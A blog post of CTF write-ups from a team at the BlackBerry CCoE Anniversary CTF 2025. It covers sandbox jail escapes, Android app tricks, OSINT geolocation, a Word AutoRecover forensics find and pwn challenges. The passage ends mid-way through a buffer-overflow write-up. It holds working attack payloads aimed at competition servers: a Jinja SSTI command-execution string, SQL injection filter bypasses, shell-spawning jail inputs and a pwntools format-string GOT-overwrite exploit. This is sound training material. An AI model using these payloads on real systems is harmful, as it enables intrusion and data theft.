---
layout: post
title:  "BlackBerry CCoE Anniversary CTF 2025"
date:   2025-05-11 00:00:00 +0800
tags:  web forensics mobile jail osint pwn
description: Our team USM Biawaks, consisting of me and my 2 juniors (@naomitham and @selinatan) played our first on-site CTF at BlackBerry CCoE Anniversary CTF and we ranked 6th. Here's our writeups for some of the challenges from the event.
image: /assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/preview.png
---


## Preface

Our team USM Biawaks, consisting of me and my 2 juniors (@naomitham and @selinatan) played our first on-site CTF at BlackBerry CCoE Anniversary CTF and we ranked 6th.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/usm_biawaks.jpg){: width="400" height="100" }

Pretty sure this is the first time our school has ever been invited to a CTF event, and I think we did really well for our debut 😁.
Huge thanks to REHACK and BlackBerry CCoE for the invite, and also to our school for supporting us throughout the event!
Thank you for giving us the opportunity to compete with all the other talented hackers in Malaysia.

## Challenges that we solved during the event

### Eevee Jail - 1 (Jail)

> Find a way out from this jail! Flag is at flag.txt
> 
> Author n3r

jail-1.py
```python
#!/usr/local/bin/python
from shell import shell

blacklist = ["flag", "locals", "vars", "\\", "{", "}"]

banner = '''
========================
=    Eevee's Jail 1    =
========================
'''

print(banner)

for _ in [shell]:
    while True:
        try:
            huh = ascii(input("[+] > "))
            if any(no in huh for no in blacklist):
                raise ValueError("[!] Mission Failed. Try again.")
            exec(eval(huh))
        except Exception as err:
            print(f"{err}")
```

The user's input is getting eval'ed then exec'ed, so you can just spawn a bash shell to break the jail.

```
[+] > import os;os.system('bash')
ls
flag.txt
jail-1.py
shell.py
cat flag.txt
bbctf{is_th3r3_another_w4y_70_solv3_this?}
```

### Eevee Jail - 2 (Jail)

> Someone said that if the jail is simple, it's easy to escape from it. Flag is at flag.txt
>
> Author: n3r
> 
> nc 157.180.92.15 9002 

jail-2.sh
```sh
#!/bin/sh

echo "========================
=    Eevee's Jail 2    =
========================"

while :
do
        read -p "[+] > " huh
        o=`$huh`
done
```

The user input is just getting executed, so you can spawn a shell to escape the jail.
However, we don't get any outputs from our commands, so we'll need to redirect STDOUT to STDERR.

```
marcus@Marcuss-MacBook-Air eevee2 % nc 157.180.92.15 9002 
========================
=    Eevee's Jail 2    =
========================
[+] > sh
sh
cat flag.txt 1>&2
cat flag.txt 1>&2
bbctf{wow, thats interesting}
```

### Eevee Jail - 3 (Jail)

> Your neighbour can be a bit tricky. Sometimes they help you, sometimes they betray you. Flag is at flag.txt
> 
> Author: n3r
> 
> nc 157.180.92.15 9003 

jail-3.sh
```sh
#!/bin/bash

echo "========================
=    Eevee's Jail 3    =
========================"

function blacklist {
        if [[ $1 == *[abcdfgijklquwxz'/''<''>''&''$']* ]]
        then
                return 0
        fi

        return 1
}

while :
do
        read -p "[+] > " huh
        if blacklist "$huh"
        then
                echo -e '[!] Mission Failed'
        else
                output=`$huh < /dev/null` &>/dev/null
                echo "Command executed"
        fi
done 
```

The blacklist in Eevee3 prevents some of the characters you'd normally use for command arguments to spawn an interactive shell, i.e `-I`, `-c`.
The characters needed to spell flag.txt are also blocked.

I tried different things then I found that `python3` passess the blacklist filter.
However, we can't use python in interactive mode or use `-c` to escape the jail because of the blacklist.
At this point, my idea was to leak the flag through python syntax errors.

The trick here is because python doesn't care about file extensions, as long as the text file you pass to it has valid python syntax.
So, if we pass in the flag as a script to python (which doesn't have valid python code), it will try to parse it and throw a syntax error to leak the flag.
We use `*` because we can't spell flag, so we just try to execute everything in the current working directory as python scripts.

```
marcus@Marcuss-MacBook-Air eevee3 %  nc 157.180.92.15 9003 
========================
=    Eevee's Jail 3    =
========================
[+] > python3 *
python3 *
  File "flag.txt", line 1
    bbctf{you really escape the prison this way huh?}
         ^
SyntaxError: invalid syntax
Command executed
```

### Eevee Jail - 4 (Jail)

> Another jail? Now what? Flag is at flag.txt
> 
> Author: n3r

jail-4.php
```
<?php

echo "========================\n";
echo "=    Eevee's Jail 4    =\n";
echo "========================\n";

echo "[+] > ";
$var = trim(fgets(STDIN));

if($var == null) die("[?] Input needed to escape this prison\n");

function filter($var) {
        if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
} else {
        echo "[!] Restricted characters has been used";
}
echo "\n";
?>
```

This PHP jail filters out common functions for executing system commands and reading the flag directly.
The goal here is to find another PHP function that allows us to read the flag without.

We can use [highlight_file](https://www.php.net/manual/en/function.highlight-file.php) to read any file and `glob()` to do wildcard matching on filenames because "flag" is filtered.

```
marcus@Marcuss-MacBook-Air eevee4 % nc 157.180.92.15 39325
========================
=    Eevee's Jail 4    =
========================
[+] > highlight_file(glob("fl*txt")[0]);
<code><span style="color: #000000">
bbct{hmm..&nbsp;so&nbsp;unpopular&nbsp;php&nbsp;function&nbsp;i&nbsp;guess?}<br /></span>
</code>
```

You'll have to render the HTML to get the actual flag, I got it wrong a couple of times :)

Flag:  bbct{hmm.. so unpopular php function i guess?}

### Eevee Jail - 5 (Jail)

> How do you even escape this? Flag is at flag.txt
> 
> Author: n3r

```rb
#!/usr/bin/env ruby

ALLOWED_COMMANDS = ["ls"]

def sanitize_input(input)
  forbidden_words = %w[flag eval system read exec irb puts dir]
  
  forbidden_pattern = /\b(?:#{forbidden_words.join('|')})\b/

  if input.match(/[&|<>$`]/) || input.match(forbidden_pattern)
    return false
  end
  true
end

def execute_command(cmd)
  if ALLOWED_COMMANDS.include?(cmd.split.first)
    system(cmd)
  else
    puts "Command not allowed!"
  end
end

puts "========================\n"
puts "=    Eevee's Jail 5    =\n"
puts "========================\n"

while true
  print "[+] > "
  input = gets.chomp

  unless sanitize_input(input)
    puts "Invalid characters detected!"
    next
  end

  if input.start_with?("ruby:")
    begin
      eval(input[5..])
    rescue Exception => e
      puts "Error: #{e.message}"
    end
    next
  end

  execute_command(input)
end
```

In this ruby jail, there are 2 ways we can execute commands.
The first is through `execute_command(cmd)` but only `ls` is allowed.
The second is through `eval(input[5..])` when the user's input starts with `ruby:`

The goal here is to execute system commands using ruby without using any of the filtered words.
My idea was to make syscalls since it would let us call /bin/sh without using system.
You can refer to [this](https://aonemd.com/posts/making-system-calls-from-ruby/) blog post on making system calls from ruby.

```
root@aa2084ac62b0:/ctf# nc 157.180.92.15 39022
========================
=    Eevee's Jail 5    =
========================
[+] > ruby:syscall(59, "/bin/sh", 0, 0)
ruby:syscall(59, "/bin/sh", 0, 0)
: 0: can't access tty; job control turned off
$ ls
ls
flag.txt  jail-5.rb
$ cat flag.txt
cat flag.txt
bbctf{different language, same approach xx}
```

### Strings (Mobile)

> Introduction to mobile source code review
>
> Author: Identities

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/strings_screen.png){: width="300" height="100" }
_strings MainActivity_

The app just prints Hello World.
From the challenge name, it's a pretty good guess that the flag is stored as a string in the apk.
Strings in an Android app are stored in strings.xml and we'll find the flag here.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/string_stringsxml.png)
_strings.xml_

### Error Messages (Mobile)

> Walao wei this intern. Released the app while we are still in development.
> 
> Author: Identities

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/errormsg_screen.png){: width="300" height="100" }
_errormessages MainActivity_

This app also just prints a message to the screen.
From the challenge name, it's a pretty good guess that the flag is in the log messages of the app.
You can view log messages from Android apps using Logcat. I used Android Studio here since it's easier.
You also need to get the Android package's name to filter out the other noise.

```
marcus@Marcuss-MacBook-Air strings % adb shell pm list packages -3
package:definitely.notvulnerable.errormesssages
```

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/errormsg_logcat.png)
_Flag in Logcat logs_

### Spawning an Export (Mobile)

> Get you spawn the flag?
> 
> Author: Identities

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/spawning_screen.png){: width="300" height="100" }

Again, we get another app that just prints a message without any other functionalities.

If we decompile the apk with jadx, we'll find another activity other than MainActivity.

AndroidManifest.xml
```
<activity
    android:name="definitely.notvulnerable.spawn.flag"
    android:exported="true"/>
<activity
    android:name="definitely.notvulnerable.spawn.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

You can think of activities as the interfaces of an app that the user interacts with.
In this case, we have a hidden activity that should just give us the flag.

To solve, we'll launch the activity through adb.

You'll need the package name beforehand
```
marcus@Marcuss-MacBook-Air spawning % adb shell pm list packages -3
package:definitely.notvulnerable.spawn
```

Launch the activity
```
adb shell am start -n definitely.notvulnerable.spawn/definitely.notvulnerable.spawn.flag
```

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/spawning_flag.png){: width="300" height="100" }

### Sekurenote (Web)

> I dont think you are able to get the flag. The captcha is too strong :(
>
> Note: This challenge's login is meant to be bruted. Check source code for which wordlist to use :)
>
> Author: vicevirus
> http://157.180.92.15:7999/


There is an SSTI vulnerability in `admin_notes()` because the `safe` filter is used to render the user's input.
When `safe` is used, Jinja assummes that you've properly sanitized the user's input, and will not escape them.

```python
def admin_notes():
    if not session.get('admin'):
        return jsonify({'error': 'unauthorized'}), 403
    note_render = ''
    if request.method == 'POST':
        raw_note = request.form.get('note', '')
        try:
            note_render = render_template_string(raw_note)
        except:
            note_render = 'Error rendering note.'
    return render_template_string('''
...[SNIP]...
        <div style="margin-top: 1rem;">{{note_render|safe}}</div>
      </div>
    </body>
    </html>
    ''', note_render=note_render)
```

To call `admin_notes()`, we must first be the admin user.

This is shown in `login()`.
The admin's hardcoded password is RANDOMPASSWORD when testing locally.
The hint suggests that we need to brute force the admin's password with the rockyou wordlist.

```python
def login():
    message = None
    message_class = ''
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        captcha_input = request.form.get('captcha', '')
        if captcha_input.upper() != session.get('captcha', '').upper():
            message = 'Captcha incorrect. Please try again.'
            message_class = 'error'
        elif username == 'admin' and password == 'RANDOMPASSWORD': # rockyou
```

There is also another reusable CAPTCHA vulnerability here, which lets us brute force the user's password.

Eventually, you'll get a hit on "peaches".
Then we can login as admin, and use the SSTI vulnerability to read the flag on the server.

SSTI payload:
```{% raw %}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```{% endraw %}

Flag: BBCTF{c4ptcha_4nd_sst1_m4st3r!}

### sqli-1 (Web)

> This store is only for my customers to visit and do online purchase. There are Apple, Banana and Cherry. Nothing else right?
> 
> Author: yappare
> http://157.180.92.15:5001/ 

To use the search function, we need to set the user agent to UMCS-CTF.
```python
def index():
    if request.method == 'POST':
        search_term = request.form.get('search')

        user_agent = request.headers.get('User-Agent')
        if user_agent != 'UMCS-CTF':
            return abort(403)  

        query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"
        cursor = mysql.connection.cursor()
        try:
            cursor.execute(query)
            results = cursor.fetchall()
            return render_template('index.html', results=results)
        except:
            return abort(403) 
    return render_template('index.html')
```

The SQLi is at Line 13 in app/routes.py.
We can do a UNION SELECT to retrieve the flag from the flag table.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/sqli1_flag.png)
_UNION SELECT flag_

### sqli-2 (Web)

> My previous web store was hacked. :( I now understand what needs to be done. I will give you no more space hackers!
> 
> Author: yappare
> http://157.180.92.15:5002/ 

Similar to sqli-1, but this time the server filters for space and comma characters so we can't do a simple UNION SELECT with the SQLi.

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        search_term = request.form.get('search')

        if ' ' in search_term or ',' in search_term:
            return abort(403)  
            
        query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"
        cursor = mysql.connection.cursor()
        try:
            cursor.execute(query)
            results = cursor.fetchall()
            return render_template('index.html', results=results)
        except:
            return abort(403)  
    return render_template('index.html')
```

[Ippsec](https://www.youtube.com/watch?v=61kf4CEnOZk) goes over the trick to bypass this filter, but essentially we'll use aliases and JOINs to substitute the comma characters in our UNION SELECT query.

To bypass the space character filter, you can use any other whitespace character. I used `/**/` comments.

Payload:
```
apple'/**/union/**/all/**/select/**/*/**/from/**/(select/**/null)/**/as/**/a/**/cross/**/join/**/(select/**/flag_value/**/from/**/flag)/**/as/**/b;--/**/-'
```

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/sqli2_flag.png)
_UNION without commas and spaces_

### Lost and Found (Misc)

> A historic ship was lost and sank, then rediscovered a century later. Track down the research vessel that found it and uncover the location of the home port, where the vessel docks regularly. Find out the GPS location of the home port of that research vessel and rounded to three decimal places.
>
> Flag Format: bbctf{latitude_longitude} rounded to three decimal places.
>
> Added description as hint The ship that you found on the Google Maps with the ship name is pointed incorrectly. You can find out the correct ship with Google Search View
> 
> Author: sREe
>
> Solved by @selinatan

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_1.png)
_Endurance ship_
The image given shows a ship trapped in ice. It is Endurance ship.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_2.png)
Research indicates that the SA Agulhas II, a South African research vessel, discovered the wreck.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_3.png)
Its home port is identified as Cape Town.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_4.png)
A search for "SA Agulhas II Cape Town" in Google Map provides the general docking area, but the port's GPS coordinates are not the flag.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_5.png)
Then switch to Street View along E Pier Road reveals a red and white ship looks similar as the SA Agulhas II.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_6.png)
Zooming in confirms the ship is the SA Agulhas II.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/lostandfound_7.jpg)
Exiting Street View and pointing the ship's exact location and get the GPS location

Flag: bbctf{-33.902_8.425}


### 🚩 (Misc)

> A past MCC participant shared a mysterious image of a red flag on a online map during their stay at a hotel. Hmmm, I just need to find out which year of the MCC batch stayed at which hotel.
> 
> Note: Flag itself is appeared as the file type mentioned in description.
> 
> Flag format: bbctf{.....}
>
> Author: sREe
> Solved by @naomitham

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/flag_1.jpg)
Search "MCC red flag" on google Map then directly get the location.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/flag_2.png)
Clicking on the associated image in the search results, which showed the flag.

Flag: bbctf{r3d_fl4g_5p0tt3r}

### Jurassic.MY (Misc)

> On a peaceful road in a distant location, a peculiar dinosaur crossing sign was spotted. The dinosaur shown on the bright yellow sign contrasts sharply with the surrounding dense forest. This odd and unexpected sight has drawn attention, leading people to question where it is and why. Locate this sign's precise GPS location, round it close to three decimal places.
> 
> Flag Format: bbctf{latitude_longitude} rounded to three decimal places.
> 
> Author: sREe
>
> Solved by @naomitham

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/jurassic_1.png)
_velociraptor.png_

The first thing I did was upload the provided image (velociraptor.png) to Google Lens to check for any similar matches. 
To my surprise, it turned out to be a viral image on the internet.
I browsed through the TikTok comments, hoping someone had pinpointed the exact location of the road sign, but had no luck.

However, a few online news sources mentioned that it might be somewhere along Jalan Kuala Ketil in Sungai Petani.
I attempted to scan the long stretch of road on Google Maps, but it proved too time-consuming. 

Fortunately, I came across a report by [Penang China Press](https://penang.chinapress.com.my/20250213/%E7%BD%91%E4%BC%A0%E9%9C%B8%E7%8E%8B%E9%BE%99%E6%A0%87%E5%BF%97-%E7%9C%8B%E6%9D%BF%E5%9B%BE%E6%A1%88%E5%B7%B2%E5%8E%BB%E9%99%A4/), which mentioned that the road sign is located somewhere along the route from Yarra Park heading toward Jalan Kuala Ketil. 

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/jurassic_2.png)
_Penang China Press_

Now the I have narrowed down the search area, it didn’t take long to find the signboard with Google Street View. 
And that led me to the correct coordinates for the flag.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/jurassic_3.png)
_Flag coordinates_

Overall, this was a fun challenge to kick off the CTF in the MISC category ^^.

Flag: bbctf{5.617_100.557}

### Etched in History (Misc)

> An image of an intricate wood carving statue tied to a region known for its rich heritage and craftsmanship has surfaced. Use your OSINT skills to trace its cultural significance and historical context. Find out the location of the museum where the statue is displayed. Give the exact GPS coordinates close to three decimal places.
>
> Flag Format: bbctf{latitude_longitude} rounded to three decimal places.
>
> Author: sREe

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/history_1.jpg)
_Challenge file_

Upon realizing that this challenge was also an OSINT task requiring us to obtain the coordinates of a museum for the flag, I decided to apply the same approach I used in the Jurrasic.MY challenge. I started by reverse searching the given image using Google Lens and found a highly similar match. The link led me to a blog post on Mobile01 titled "鄒鄒週週環島－－車小志氣高小雲豹之死人骨頭秘徑," authored by a motorcyclist documenting his journey around Taiwan. As I read through his blog, I discovered that the photo was taken during his visit to an exhibition in Pingtung. The next step was to search for the name of the exhibition and its location. After some digging, I came across a Facebook post that matched the event mentioned in the blog. This post confirmed that it was indeed the same exhibition visited by the motorcyclist, and it also specified the venue where the exhibition took place:

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/history_2.png)
_[https://www.facebook.com/laiyi1000105/posts/pfbid0GxFwhRGL5tXeNFRxDHAz45H5XDgHhSmmF2SrQUCAoth2UhtsFvVroGiDLQuEykMBl](https://www.facebook.com/laiyi1000105/posts/pfbid0GxFwhRGL5tXeNFRxDHAz45H5XDgHhSmmF2SrQUCAoth2UhtsFvVroGiDLQuEykMBl)_

With the exhibition details in hand, I turned to Google Maps to pinpoint the exact location of the museum.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/history_3.png)
_[Pingtung County Laiyi Aboriginal Museum](https://www.google.com/maps/place/Pingtung+County+Laiyi+Aboriginal+Museum/@22.4344809,120.6373585,15z/data=!4m15!1m8!3m7!1s0x346e278555555555:0x31d11eb0c6a831d7!2sPingtung+County+Laiyi+Aboriginal+Museum!8m2!3d22.4344809!4d120.6373585!10e5!16s%2Fg%2F1tfpr_xm!3m5!1s0x346e278555555555:0x31d11eb0c6a831d7!8m2!3d22.4344809!4d120.6373585!16s%2Fg%2F1tfpr_xm?entry=ttu&g_ep=EgoyMDI1MDUwNy4wIKXMDSoASAFQAw%3D%3D)_

I also browsed through the images uploaded by previous visitors on Google Maps to check if any matched the given image – and sure enough, I found a match. This confirmed that I had identified the correct museum.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/history_3.png)
_We found the same statues from the challenge file_

Flag: bbctf{22.434_120.637}

### Where It all Began (Misc)

> A photograph of an old American school bus converted into a cafe was recently shared by someone searching for a lost connection. This cafe was their first meeting spot, a place filled with fond memories. They hope to rediscover its exact location to rekindle those moments.
> 
> Flag Format: bbctf{latitude_longitude} rounded to three decimal places.
>
> Author: sREe
> 
> Solved by @naomitham

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/whereitallbegan_1.png)
_Challenge file_

This challenge was originally attempted by @selinatan, she figured out that the coffee bus is located at Chiangmai, Thailand.
I then tried to search for “school bus café thailand”, thinking that it could be a tourist hotspot.
I then noticed that there is the same image in Flickr [here](https://www.flickr.com/photos/76521871@N05/6863082370 ).

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/whereitallbegan_4.png)
_Same image as challenge file on Flickr_

So I searched for “chiang mai coffee bus” in Google Maps. 

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/whereitallbegan_2.png)
_Coffee Bus_

The coordinates of this search result is not the correct flag, so I tried to view the place with Google Street View, hoping to get a more precise set of coordinates. And there’s the flag: bbctf{18.824_99.010} 

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/whereitallbegan_3.png)
_Flag coordinates_

### F*** Microsoft (Forensics)

> OMG. I HATE WINDOWS UPDATE. HOW CAN YOU AUTO UPDATE WHEN IM 80% DONE WITH MY ASSIGNMENT. I DIDN’T SAVE ANYTHING, IT BETTER AUTO RECOVERS.
>
> Author: Identities

In this challenge, a zip file is given with a .ad1 file. We used the FTK Imager which is a digital forensic tool to inspect the image. Upon inspection, it is found that in the Desktop folder, there is an Assignment folder containing .docx files. One of them is the Word file which is believed not to be the one with the latest changes saved, as we searched for the flag in the file but did not find it. Therefore, there must be a recovered file containing the most recent version.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/msft_1.png)
_C:/Users/kali/Desktop/Assignment_

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/msft_2.png)
_No flag in the docx :(_

Microsoft Word uses AutoRecover files (`*.asd`) to temporarily store unsaved changes in the event of an unexpected shutdown or crash.

These AutoRecover files are stored in `C:\Users\Username\AppData\Roaming\Microsoft\Word` .

We extracted the AutoRecover file and found the flag in it.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/msft_4.png)
_Flag in AutoRecovery save of CTF Assignment.asd_

Flag: `bbctf{TH@NkS_FOr_tHi$_Fea7uR3_,_mY_AS5iGnMeNT_IsNt_G0nE}`

## Challenges that I didn't get to try during the event

### GOT DAMN!!!!!!!! (Pwn)

> How does an ELF file knows where the imported function being stored?????
> 
> **Author: CapangJabba**

This challenge is about using a printf vulnerability to overwrite a GOT entry to ret2win.

Binary protections:
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/gotdamn$ checksec chall
[*] '/home/benkyou/Dev/bbctf/gotdamn/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

If we look at the symbols in the binary, we'll find a win function.

```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/gotdamn$ nm ./chall 
...[SNIP]...
000000000040121d T win
```

Disassembling `win`, the function loads some value at `[rip+0xddc]` into `rdi` before calling `system`.
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/gotdamn$ objdump -S ./chall -M intel --disassemble=win
...[SNIP]...
000000000040121d <win>:
  40121d:       f3 0f 1e fa             endbr64 
  401221:       55                      push   rbp
  401222:       48 89 e5                mov    rbp,rsp
  401225:       48 8d 05 dc 0d 00 00    lea    rax,[rip+0xddc]        # 402008 <_IO_stdin_used+0x8>
  40122c:       48 89 c7                mov    rdi,rax
  40122f:       b8 00 00 00 00          mov    eax,0x0
  401234:       e8 77 fe ff ff          call   4010b0 <system@plt>
  401239:       90                      nop
  40123a:       5d                      pop    rbp
  40123b:       c3                      ret    
```

If we step through the program, we'll find that "/bin/sh" is the value loaded into `rdi`.

```
pwndbg> b main
Breakpoint 1 at 0x401244
pwndbg> disassemble win
Dump of assembler code for function win:
   0x000000000040121d <+0>:     endbr64
   0x0000000000401221 <+4>:     push   rbp
   0x0000000000401222 <+5>:     mov    rbp,rsp
   0x0000000000401225 <+8>:     lea    rax,[rip+0xddc]        # 0x402008
   0x000000000040122c <+15>:    mov    rdi,rax
   0x000000000040122f <+18>:    mov    eax,0x0
   0x0000000000401234 <+23>:    call   0x4010b0 <system@plt>
   0x0000000000401239 <+28>:    nop
   0x000000000040123a <+29>:    pop    rbp
   0x000000000040123b <+30>:    ret
End of assembler dump.
pwndbg> b *win+8
Breakpoint 2 at 0x401225
pwndbg> r
...[SNIP]...
pwndbg> jump win
Continuing at 0x401225.

Breakpoint 2, 0x0000000000401225 in win ()
...[SNIP]...
*RIP  0x401225 (win+8) ◂— lea rax, [rip + 0xddc]
─────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────
 ► 0x401225 <win+8>     lea    rax, [rip + 0xddc]     RAX => 0x402008 ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x40122c <win+15>    mov    rdi, rax               RDI => 0x402008 ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x40122f <win+18>    mov    eax, 0                 EAX => 0
   0x401234 <win+23>    call   system@plt                  <system@plt>
 
   0x401239 <win+28>    nop    
   0x40123a <win+29>    pop    rbp
   0x40123b <win+30>    ret    
 
   0x40123c <main>      endbr64 
   0x401240 <main+4>    push   rbp
   0x401241 <main+5>    mov    rbp, rsp
   0x401244 <main+8>    sub    rsp, 0x170
```

So, our goal is to change the control flow of the program to `win` to spawn a bash shell.

To do this, we'll leverage a `printf` vulnerability in the program.

![printf vulnerability](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/got_printf.png)
_printf vulnerability_

The hex values for `%x ` start at offset 10.
```
Welcome to this GOTDamn 'leave a message' system
Enter your name: aaaa
Enter your message: %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Thank you
Mr/Ms aaaa
ffffd500 0 0 73 ffffffff 61616161 0 0 3e8 25207825 20782520 78252078 25207825 20782520
```

Finally, we use `%n` to use `printf` to overwrite the GOT entry for `puts`.
`puts` just happens to get called right after the `printf` in this program, so it will point to the address of `win` after the overwrite.

The exploit:
```python
from pwn import *

elf = ELF("./chall")
# p = elf.process()
p = remote("157.180.92.15", 56647)
context.binary = elf

p.sendlineafter(b"Enter your name: ", b"AAAA")
payload = fmtstr_payload(10, {elf.got['puts'] : elf.symbols.win})
p.sendlineafter(b"Enter your message: ", payload)

p.interactive()
``` 

Flag: bbctf{dontwealllovegot}

### THERE_SIR (Pwn)

> where does a pointer points to?
> 
> **Author: CapangJabba**

This is another ret2win challenge where the win function calls `system`.
The challenge involves writing "/bin/sh" to a writable memory section in the program to call `system` as we don't have a libc leak.

Binary protections:
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/there_sir$ checksec chall
[*] '/home/benkyou/Dev/bbctf/there_sir/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Right off the bat, we know the program is vulnerable to buffer overflow.
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/there_sir$ python3 -c 'print("A"*100)' | ./chall
Enter something: Enter message: Segmentation fault (core dumped)
```

If we look at the symbols in the binary, we'll find `vuln` and `win`.
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/there_sir$ nm ./chall
...[SNIP]...
00000000004012e5 T vuln
000000000040129c T win
```

Disassembling `vuln`, we know that the buffer overflow occurs at the second call to `read`, when the program asks you to "Enter message:". Here, the program reads in  0x400 bytes into the buffer which causes the overflow.

```
root@531d805bd551:/ctf#  objdump -M intel -S ./chall --disassemble=vuln
...[SNIP]...
00000000004012e5 <vuln>:
  4012e5:       f3 0f 1e fa             endbr64 
  4012e9:       55                      push   rbp
  4012ea:       48 89 e5                mov    rbp,rsp
  4012ed:       48 83 ec 40             sub    rsp,0x40
  4012f1:       48 8d 05 25 0d 00 00    lea    rax,[rip+0xd25]        # 40201d <_IO_stdin_used+0x1d>
  4012f8:       48 89 c7                mov    rdi,rax
  4012fb:       b8 00 00 00 00          mov    eax,0x0
  401300:       e8 cb fd ff ff          call   4010d0 <printf@plt>
  401305:       ba 10 00 00 00          mov    edx,0x10
  40130a:       48 8d 05 7f 2d 00 00    lea    rax,[rip+0x2d7f]        # 404090 <hurm>
  401311:       48 89 c6                mov    rsi,rax
  401314:       bf 00 00 00 00          mov    edi,0x0
  401319:       e8 d2 fd ff ff          call   4010f0 <read@plt>
  40131e:       48 8d 05 0a 0d 00 00    lea    rax,[rip+0xd0a]        # 40202f <_IO_stdin_used+0x2f>
  401325:       48 89 c7                mov    rdi,rax
  401328:       b8 00 00 00 00          mov    eax,0x0
  40132d:       e8 9e fd ff ff          call   4010d0 <printf@plt>
  401332:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401336:       ba 00 04 00 00          mov    edx,0x400
  40133b:       48 89 c6                mov    rsi,rax
  40133e:       bf 00 00 00 00          mov    edi,0x0
  401343:       e8 a8 fd ff ff          call   4010f0 <read@plt>
  401348:       90                      nop
  401349:       c9                      leave  
  40134a:       c3                      ret   
```

Disassembling `win`, we see that the value in `rdi` is `cmp` with 0x539.
If this is true, then it branches to `<win+58>` which loads the value from `rsi` into `rdi` and calls `system`.

```
pwndbg> disassemble win
Dump of assembler code for function win:
   0x000000000040129c <+0>:     endbr64
   0x00000000004012a0 <+4>:     push   rbp
   0x00000000004012a1 <+5>:     mov    rbp,rsp
   0x00000000004012a4 <+8>:     sub    rsp,0x10
   0x00000000004012a8 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x00000000004012ab <+15>:    mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004012af <+19>:    cmp    DWORD PTR [rbp-0x4],0x539
   0x00000000004012b6 <+26>:    je     0x4012d6 <win+58>
   0x00000000004012b8 <+28>:    lea    rax,[rip+0xd4e]        # 0x40200d
   0x00000000004012bf <+35>:    mov    rdi,rax
   0x00000000004012c2 <+38>:    mov    eax,0x0
   0x00000000004012c7 <+43>:    call   0x4010d0 <printf@plt>
   0x00000000004012cc <+48>:    mov    edi,0x0
   0x00000000004012d1 <+53>:    call   0x401120 <exit@plt>
   0x00000000004012d6 <+58>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004012da <+62>:    mov    rdi,rax
   0x00000000004012dd <+65>:    call   0x4010c0 <system@plt>
   0x00000000004012e2 <+70>:    nop
   0x00000000004012e3 <+71>:    leave
   0x00000000004012e4 <+72>:    ret
```

Therefore, our goal is to use the buffer overflow to set the first parameter (`rdi`) to 0x539, and the second parameter (`rsi`) to "/bin/sh" to spawn a shell.

Find the offset for the buffer overflow:
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000040134b <+0>:     endbr64
   0x000000000040134f <+4>:     push   rbp
   0x0000000000401350 <+5>:     mov    rbp,rsp
   0x0000000000401353 <+8>:     sub    rsp,0x10
